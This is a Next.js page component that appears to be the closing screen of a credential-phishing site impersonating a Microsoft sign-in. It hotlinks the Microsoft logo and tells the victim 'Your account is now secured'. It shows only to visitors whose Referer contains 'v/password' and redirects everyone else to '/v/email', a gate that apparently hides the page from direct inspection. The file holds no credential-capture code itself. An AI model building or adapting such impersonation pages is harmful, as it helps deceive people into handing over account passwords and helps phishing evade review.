import { headers } from "next/headers";
import { redirect } from "next/navigation";

export default async function page() {
  const headersList = await headers();
  const referer = headersList.get("referer");

  console.log({ referer });

  if (!referer) {
    redirect("/v/email");
  }

  if (!referer.includes("v/password")) {
    redirect("/v/email");
  }
  return (
    <div className="bg-white min-h-screen p-6">
      <img
        role="img"
        src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
        alt="Microsoft"
        width={100}
        height={100}
        className="max-w-[256px] h-6 mb-8"
      />
      <div className="flex flex-col sm:items-center justify-center sm:text-center max-w-2xl mx-auto min-h-[calc(100vh-120px)]">
        <h2 className="text-4xl mb-4">Your account is now secured</h2>
        <p>We advice that you secure your account with our new AI features.</p>
        <p>
          Our technical crew will be persistent in sending you our new security
          features.
        </p>
        <p className="text-xl mt-3">Thank you.</p>
      </div>
    </div>
  );
}
